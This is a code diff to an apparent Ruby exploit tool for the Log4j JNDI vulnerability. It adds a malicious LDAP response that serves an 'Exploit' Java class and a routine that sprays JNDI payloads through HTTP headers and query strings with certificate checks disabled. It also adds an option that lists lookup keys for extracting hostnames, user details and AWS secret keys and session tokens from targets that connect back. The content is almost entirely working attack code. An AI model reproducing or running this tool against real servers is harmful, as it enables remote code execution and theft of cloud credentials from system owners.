@@ -66,6 +66,7 @@ class HTTPServer < WEBrick::HTTPServlet::AbstractServlet
 end
 
 class LDAPServer
+  # from:https://github.com/alexandre-lavoie/python-log4rce
   LDAP_RESPONSE = "0\x81\x83\x02\x01\x02d\x81}\x04\x07Exploit0\x81\x820\x1a\x04\rjavaClassName1\t\x04\x07Exploit0\x13\x04\x0cjavaCodeBase1\x03\x04\x01#0$\x04\x0bobjectClass1\x15\x04\x13javaNamingReference0\x18\x04\x0bjavaFactory1\t\x04\x07Exploit0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00".freeze
   LDAP_PA       = "0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00".freeze
 
@@ -204,20 +205,24 @@ class Log4JExploit
     @jndi_payload[2..-2] = jndi_payload
   end
 
+  def send_request(uri, header)
+    http = Net::HTTP.new(uri.hostname, uri.port)
+    http.read_timeout = 5
+    http.open_timeout = 5
+    if uri.scheme == 'https'
+      http.use_ssl = true
+      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
+    end
+
+    request_uri = header.empty? ? uri + "?z=#{@jndi_payload}" : uri
+    request = http.request(Net::HTTP::Get.new(request_uri, header))
+  end
+
   def send_http_request
     uri = URI.parse(@target)
-    headers.shuffle.each do |header_key|
+    headers.push('').shuffle.each do |header_key|
       header = { header_key => @jndi_payload }
-      http = Net::HTTP.new(uri.hostname, uri.port)
-      http.read_timeout = 5
-      http.open_timeout = 5
-      if uri.scheme == 'https'
-        http.use_ssl = true
-        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
-      end
-
-      request = Net::HTTP::Get.new(uri, header)
-      http.request(request)
+      send_request(uri, header)
       break unless @connect_back.string.empty?
     end
     Notlog4j.info("\e[32m#{@target} is using vulnerable log4j library\e[0m")
@@ -263,19 +268,47 @@ def parse_args
       args[:command] = value
     end
 
-    opts.on('--serve_only', '-s', 'Starts HTTP and LDAP Server') do
+    opts.on('--serve_only', '-s', '[OPTIONAL] Starts HTTP and LDAP Server, then send JNDI payload manually') do
       args[:serve_only] = true
     end
 
-    opts.on('--info_extract', '-i Info_key', 'Extracts information from the target.') do |value|
+    # from: https://twitter.com/therceman/status/1470768985302048774/photo/1
+    opts.on(
+      '--info_extract',
+      '-i Info_key',
+      '[OPTIONAL] Extracts information from the target using log4j keywords. Default is none.'\
+      "Possible inputs but not limited to below:\n"\
+      "\t\t\t\t\t${hostName}\n"\
+      "\t\t\t\t\t${sys:user.name}\n"\
+      "\t\t\t\t\t${sys:user.home}\n"\
+      "\t\t\t\t\t${sys:user.dir}\n"\
+      "\t\t\t\t\t${sys:java.home}\n"\
+      "\t\t\t\t\t${sys:java.vendor}\n"\
+      "\t\t\t\t\t${sys:java.version}\n"\
+      "\t\t\t\t\t${sys:java.vendor.url}\n"\
+      "\t\t\t\t\t${sys:java.vm.version}\n"\
+      "\t\t\t\t\t${sys:java.vm.vendor}\n"\
+      "\t\t\t\t\t${sys:java.vm.name}\n"\
+      "\t\t\t\t\t${sys:os.name}\n"\
+      "\t\t\t\t\t${sys:os.arch}\n"\
+      "\t\t\t\t\t${sys:os.version}\n"\
+      "\t\t\t\t\t${env:JAVA_VERSION}\n"\
+      "\t\t\t\t\t${env:AWS_SECRET_ACCESS_KEY}\n"\
+      "\t\t\t\t\t${env:AWS_SESSION_TOKEN}\n"\
+      "\t\t\t\t\t${env:AWS_SHARED_CREDENTIALS_FILE}\n"\
+      "\t\t\t\t\t${env:AWS_WEB_IDENTITY_TOKEN_FILE}\n"\
+      "\t\t\t\t\t${env:AWS_PROFILE}\n"\
+      "\t\t\t\t\t${env:AWS_CONFIG_FILE}\n"\
+      "\t\t\t\t\t${env:AWS_ACCESS_KEY_ID}"
+    ) do |value|
       args[:info_extract] = value
     end
 
-    opts.on('--obfuscate', '-o', 'Obfuscates the JNDI Payload') do
+    opts.on('--obfuscate', '-o', '[OPTIONAL] Obfuscates the JNDI Payload') do
       args[:obfuscate] = true
     end
 
-    opts.on_tail('--help', 'Print options') do |show_help|
+    opts.on_tail('--help', 'Print options') do
       warn opts
       exit(0)
     end
